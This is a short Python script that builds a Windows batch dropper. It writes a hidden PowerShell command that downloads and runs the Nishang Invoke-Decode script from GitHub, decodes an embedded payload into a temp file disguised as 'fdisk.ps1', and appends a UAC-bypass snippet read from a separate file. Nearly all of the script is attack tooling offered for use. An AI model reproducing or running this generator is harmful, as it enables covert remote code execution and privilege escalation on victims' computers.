import os
import codecs
__author__ = 'nekocode'


file_1 = codecs.open('_payload.txt', 'r', 'utf-16')
payload = file_1.read().strip(u' \r\n')
file_1.close()

file_2 = codecs.open('_bypass_uac.txt', 'r', 'utf-16')
bypass = file_2.read().strip(u' \r\n')
file_2.close()

if not os.path.exists('output'):
    os.mkdir('output')


file_output = codecs.open('output/output.bat', 'w', 'ascii')
file_output.write(u'powershell -NoP -NonI -W Hidden -C "IEX (New-Object System.Net.Webclient).'
                  u'DownloadString(\'https://raw.githubusercontent.com/samratashok/nishang/master'
                  u'/Utility/Invoke-Decode.ps1\');Invoke-Decode  ' + payload +
                  u'   -IsString -OutputFilePath $env:temp/fdisk.ps1"' + u'\n\n' +
                  bypass)

file_output.flush()
file_output.close()

